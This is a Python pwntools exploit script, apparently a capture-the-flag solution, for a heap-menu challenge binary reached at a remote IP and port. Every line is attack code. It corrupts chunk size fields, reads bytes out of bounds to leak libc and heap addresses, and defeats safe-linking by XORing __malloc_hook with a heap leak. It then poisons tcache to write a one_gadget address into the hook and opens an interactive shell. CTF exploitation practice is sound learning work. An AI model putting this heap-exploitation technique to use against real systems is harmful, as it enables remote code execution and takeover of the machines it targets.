#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./challenge")
# p = process("./challenge")
p = remote("104.197.118.147", 10160)
libc = ELF("./libc.so.6")
# gdb.attach(p,"init-gef")

def buy_orange(orange_number,size):
    p.sendlineafter("> ","1") 
    p.sendlineafter("Orange number: ",str(orange_number))
    p.sendlineafter("Size: ",str(size))

def modify_orange(orange_number,cell_index,value):
    p.sendlineafter("> ","2")
    p.sendlineafter("Orange number: ",str(orange_number))
    p.sendlineafter("Cell index: ",str(cell_index))
    p.sendlineafter("New value: ",str(value))

def leak_byte(orange_number,cell_index):
    p.sendlineafter("> ","2")
    p.sendlineafter("Orange number: ",str(orange_number))
    p.sendlineafter("Cell index: ",str(cell_index))
    p.recvuntil("Current value: ")
    leak = p.recvline()[:-1]
    p.sendlineafter("New value: ",leak)
    return leak
    
buy_orange(0,24)
value = 0xd51
modify_orange(0,24,value&0xff)
modify_orange(0,25,value>>8)
modify_orange(0,26,0)
buy_orange(1,3500)
libc_leak = b'\x00'
for i in range(33,40):
    leak = leak_byte(0,i)
    leak = int(leak)
    libc_leak += p8(leak)
leak = u64(libc_leak)
libc.address = leak-0x1c5c00
log.critical("Libc base: {}".format(hex(libc.address)))
__malloc_hook = libc.sym.__malloc_hook
buy_orange(0,0xd28)
buy_orange(0,0x10)
value = 0x221
modify_orange(0,24,value&0xff)
modify_orange(0,25,value>>8)
modify_orange(0,26,0)
buy_orange(1,3500)


heap_leak1 = b''

for i in range(0x20,0x28):
    leak = leak_byte(0,i)
    leak = int(leak)
    heap_leak1 += p8(leak)
heap_leak1 = heap_leak1.ljust(8,b'\x00')
heap_leak1 = u64(heap_leak1)
print(hex(heap_leak1))

buy_orange(0,0x10)
value = 0x221
modify_orange(0,24,value&0xff)
modify_orange(0,25,value>>8)
modify_orange(0,26,0)
buy_orange(1,3500)
heap_leak1 += 0x22
__malloc_hook = __malloc_hook ^ heap_leak1
__malloc_hook = p64(__malloc_hook)
for i in range(0x20,0x28):
    modify_orange(0,i,__malloc_hook[i-0x20])
buy_orange(0,0x1f8)
one_gadget = libc.address + 0xceb71
one_gadget = p64(one_gadget)
buy_orange(0,0x1f8)
for i in range(0,8):
    modify_orange(0,i,one_gadget[i])

p.interactive()